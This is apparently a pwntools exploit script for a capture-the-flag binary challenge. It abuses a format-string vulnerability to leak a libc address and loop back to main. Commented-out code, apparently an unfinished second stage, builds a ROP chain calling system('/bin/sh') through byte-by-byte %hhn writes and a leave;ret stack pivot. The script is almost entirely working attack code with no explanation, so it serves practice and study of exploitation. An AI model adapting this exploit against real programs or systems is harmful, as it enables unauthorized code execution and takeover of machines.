from pwn import *
context.binary = "./chall"


p = process()
#p = remote("challs.actf.co", 31323)
main = 0x0000000000401182
write_place = 0x404f00 - 0x200
ret = 0x000000000040101a
leave_ret = 0x00000000004011cd


def write_1_byte(addr: int, data: int):
    payload = b''
    if data==0:
        payload = f'%8$hhn'.encode().ljust(16,b'.')
    else:
        payload = f'%{data}c%8$hhn'.encode().ljust(16,b'.')
    payload += p64(addr) + p64(ret) + p64(main)
    time.sleep(0.2)
    p.sendline(payload)

def write_8_bytes(addr: int, data: int):
    to_write = [
        data & 0xff,
        (data >> 8) & 0xff,
        (data >> 16) & 0xff,
        (data >> 24) & 0xff,
        (data >> 32) & 0xff,
        (data >> 40) & 0xff,
        (data >> 48) & 0xff,
        (data >> 56) & 0xff,
    ]
    for i in range(0,len(to_write)):
        write_1_byte(addr+i,to_write[i])






first_payload = b'%29$p.'
first_payload += cyclic(24-len(first_payload)) + p64(ret) + p64(main)

p.sendlineafter(b": ", first_payload)
leak_libc = int(p.recvuntil(b'.').strip(b'.'),16)

log.info(f"Leaked libc address: {hex(leak_libc)}")

print(p.recv())

# second_payload = b'%30$p.'
# second_payload += cyclic(24-len(second_payload)) + p64(ret) + p64(main)
# # gdb.attach(p,"b*main+69")
# p.sendline(second_payload)
# write_place = int(p.recvuntil(b'.').strip(b'.'),16)
# log.info(f"Leaked stack address: {hex(write_place)}")



# libc_base = leak_libc - 0x29e40
# log.info(f"Libc base: {hex(libc_base)}")
# pop_rsi = libc_base+ 0x000000000002be51
# pop_rdx_r12 = libc_base +  0x000000000011f497
# pop_rdi = libc_base + 0x000000000002a3e5
# bin_sh = libc_base + 0x1d8698
# # system = libc_base + 0xebcf8

# system = libc_base + 0x50d60

# pop_rbp = libc_base + 0x000000000002a2e0



# write_8_bytes(write_place,pop_rdi)
# gdb.attach(p,"b*main+69")
# write_8_bytes(write_place+8,bin_sh)
# write_8_bytes(write_place+16,ret)
# write_8_bytes(write_place+24,system)


# final_payload = cyclic(24-8) + p64(write_place-8) + p64(leave_ret)

# p.recvuntil(b": ")


# p.sendline(final_payload)

# print(p.recv())

p.interactive()